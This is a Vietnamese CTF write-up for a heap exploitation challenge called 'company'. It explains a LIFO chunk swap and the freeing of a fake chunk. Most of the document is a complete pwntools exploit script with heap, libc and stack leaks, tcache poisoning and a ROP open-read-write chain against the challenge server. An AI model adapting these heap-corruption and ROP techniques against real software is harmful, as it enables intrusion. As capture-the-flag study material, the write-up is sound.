# COMPANY
- Ta thấy khi tạo 1 chunk và free ngay, nó có thể lỗi do free 1 chunk không hợp lệ (do chưa tạo feedback)
```c
free((void *)employee[v2]);
free(*(void **)(employee[v2] + 0x40LL));
```

- Ta để ý một chút lúc malloc và free như sau:
```c
// malloc
buf = (char *)malloc(0x50uLL); //register
buf = malloc(0x50uLL); //feedback
//free
    free((void *)employee[v2]);
    free(*(void **)(employee[v2] + 0x40LL));
```
- Ta thấy có lỗi LIFO
- Khi này sẽ tận dụng LIFO để đổi chỗ 2 chunk
- Khi đã đổi chỗ, ta sẽ tận dụng `free(*(void **)(employee[v2] + 0x40LL));` không kiểm tra xem feedback đã được tạo chưa và free đi một fake chunk.
- Fake chunk này ta sẽ chọn mảng `name` khi được hỏi tên gì.
- Ta có payload sau
```python
sa(b"name? ",  p64(0x0) + p64(0x61)))
register(b"0", b"0"*0x18, b"HR\0", "123")
feedback(b"0", b"0", b"a" * 0x40 + p64(0x404060+0x10))
fire("0")
register(b"1", b"1" * 0x18, b"HR\0", "123")
fire(b"1")
```

- Khi mình thử free chunk ở địa chỉ `0x..68` thì báo lỗi `free(): invalid pointer`
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/3ad32d3a-a0fc-475f-b5d6-36bc270eb5a2)
- Mình đoán là do địa chỉ như thế nào đó mà báo lỗi
- Đã có fake chunk trong danh sách
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/f32801df-642e-46cb-9ae1-9d73991bd6d2)

- Khi này ta cố gắng leak heap 
```python
register(b"1", b"1"*0x10 + b"HR\0\0\0", b"HR\0", "123")
feedback(b"1", b"1", b"b" * 0x40 + p64(0x004040a8))
fire(b"1")
# 
register(b"1", b"1" *0x18, b"HR\0", b"1")
view(b"1")
p.recvuntil(b"Feedback: ")
heap_leak = u32(p.recvline(keepends = False).ljust(4, b"\0"))
info("heap leak: " + hex(heap_leak))
```

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/2ee33e20-4d23-4870-8e99-a6fbfc9f3e94)

- Tiếp theo ta 

```python
feedback(b"1", b"1", b"b" * 0x30)
fire(b"1")
```

- Leak libc, tương tự như leak heap

```python
register(b"1", b"1"*0x10 + b"HR\0\0\0", b"HR\0", "123")
feedback(b"1", b"1", b"b" * 0x40 + p64(0x403fa0))
fire(b"1")
register(b"1", b"1" *0x18, b"HR\0", b"1")
view(b"1")
p.recvuntil(b"Feedback: ")
libc_leak = u64(p.recvline(keepends = False).ljust(8, b"\0"))
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym['puts']
info("libc base: " + hex(libc.address))
feedback(b"1", b"1", b"b" * 0x8)
fire(b"1")
```

- Trong vùng nhớ này ta có 1 địa chỉ trỏ đến địa chỉ stack
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/0024aa5b-e20e-4eaf-a52f-ee0895ff2bb5)
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/8685ae88-44c5-4577-bfbd-980caf8ee254)
- Phần còn lại ảo quá nên ta sẽ từ từ ngâm cứu sau
# Full script
```python
#!/usr/bin/env python
from pwn import *

context.arch = "amd64"
context.encoding = "latin"
context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-h"]
context.binary = elf = ELF("./company")
libc = elf.libc

sla = lambda x, y: p.sendlineafter(x, y)
sa  = lambda x, y: p.sendafter(x, y)
rl  = lambda: p.recvline()
sl  = lambda x: p.sendline(x)
c   = lambda x: str(x).encode()

gdbscript = """
b *iconv+197
c
"""
def register(idx, name, position, salary, no=False, no1=False):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b':', str(idx).encode())
    if no:
        p.sendafter(b':', name)
    else:
        p.sendlineafter(b':', name)
    if no1:
        p.sendafter(b':', position)
    else:
        p.sendlineafter(b':', position)
    p.sendlineafter(b':', str(salary).encode())

def fire(idx):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b':', str(idx).encode())

def feedback(hr, idx, feedback):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'?', str(hr).encode())
    p.sendlineafter(b'?', str(idx).encode())
    p.sendlineafter(b':', feedback)

def view_feedback(idx):
    p.sendlineafter(b'>>', b'4')
    p.sendlineafter(b'?', str(idx).encode())
    p.recvuntil(b'Feedback: ')
    return p.recvline()[:-1]

def read(addr):
    register(1, b"D", b"HR\x00", 0x1339)
    feedback(1, 1, b"E"*0x40 + p64(addr))
    fire(1)
    register(1, b"B", b"HR\x00", 0)
    leak = view_feedback(1)
    print(leak)
    leak = u64(leak[:8].ljust(8,b'\x00'))
    feedback(1, 1, b"E"*0x40 + p64(0))
    fire(1)
    return leak

def return_arb_ptr(addr):
    register(2, b"A", b"HR\x00", 0x1337)
    feedback(2, 2, b"A"*0x40 + p64(addr))
    fire(2)
    register(2, b"B", b"HR\x00", 0x1337)
    fire(2) # attempts to call free(addr)


p = remote("company.chal.crewc.tf", 17001)
# p = elf.process()
# p = gdb.debug(elf.file.name, gdbscript=gdbscript)

p.sendlineafter(b'What is your name? ', p64(0) + p64(0x61) + p64(0))

# JoshL solved most of it tho :)
register(0, b"A", b"HR\x00", 0x1337)
feedback(0, 0, b"A"*0x40 + p64(0x00404060+0x10))
fire(0)
register(1, b"B", b"HR\x00", 0x1337)
fire(1) # attempts to call free(0x00404060+0x10)
register(0, b"C"*0x10 + b"HR\x00", b"HR\x00", 0) # Got HR now


heap_leak = read(0x004040a8)
info("Heap leak %s", hex(heap_leak))
puts_libc = read(0x403fa0)
info("Libc leak %s", hex(puts_libc))

libc.address = puts_libc - libc.symbols['puts']
rop = ROP(libc)
info("Libc base %s", hex(libc.address))

stack_leak = read(libc.address + 0x7fc7955fe320-0x007fc795400000)
info("Stack leak %s", hex(stack_leak))
ret_ptr = stack_leak +0x007ffc15e06398-0x7ffc15e064f8
info("Return pointer %s", hex(ret_ptr))
stack_cookie = (read(ret_ptr - 0x10+1) << 0x8) & 0xffffffffffffffff
info("Stack cookie %s", hex(stack_cookie))

path = b"./" + b'\x00'

register(3, b"A"*0x18, b"A"*0x18, 0x41)
register(4, b"B"*0x18, b"B", 0x61)
register(5, b"C"*0x18, b"C"*0x18, 0x43)
register(6, b"D"*0x18, b"D"*0x18, 0x43)
register(7, path + (b"E"*(0x18-len(path))), b"E"*0x18, 0x43)

fire(3)
fire(6)

return_arb_ptr(heap_leak+0x20f21d0-0x20f2170-0x10)
info("Fake pointer at %s", hex(heap_leak+0x20f21d0-0x20f2170-0x10))
heap_ptr = heap_leak+0x20f21d0-0x20f2170
target = ret_ptr-0x8
register(8, p64(0)+p64(0x60)+p64(target ^ (heap_ptr >> 12)) + b"A"*8, b"F"*0x18, 0x1337133713371337, no=True)

register(3, b"A"*0x18, b"A"*0x18, 0x41)
register(6, b"/flag\x00\x00\x00" + p64(rop.rdi[0])+p64(ret_ptr)+p64(libc.symbols['gets']), p64(rop.rdi[0])+p64(ret_ptr)+p64(libc.symbols['gets']), 0x41, no=True)

flag_str = heap_leak + 0x1d69f50 - 0x1d69dd0
syscall = rop.find_gadget(['syscall', 'ret'])[0]

payload = b"A"*0x30

rop.read(0, libc.bss(0x100), 0x30)
payload += b''.join([
    rop.chain(),

    p64(rop.rdi[0]),
    p64(libc.bss(0x100)),
    p64(rop.rsi[0]),
    p64(int(constants.O_RDONLY)),
    p64(rop.rdx[0]),
    p64(0),
    p64(rop.rax[0]),
    p64(2),
    p64(syscall),

    p64(rop.rdi[0]),
    p64(3),
    p64(rop.rsi[0]),
    p64(libc.bss(0x500)),
    p64(rop.rdx[0]),
    p64(0x500),
    p64(rop.rax[0]),
    p64(0),
    p64(syscall),

    p64(rop.rdi[0]),
    p64(1),
    p64(rop.rsi[0]),
    p64(libc.bss(0x500)),
    p64(rop.rdx[0]),
    p64(0x100),
    p64(rop.rax[0]),
    p64(1),
    p64(syscall),
])
p.sendline(payload)
p.sendline(b"./flag_you_found_this_my_treasure_leaked.txt\x00")
p.interactive()


```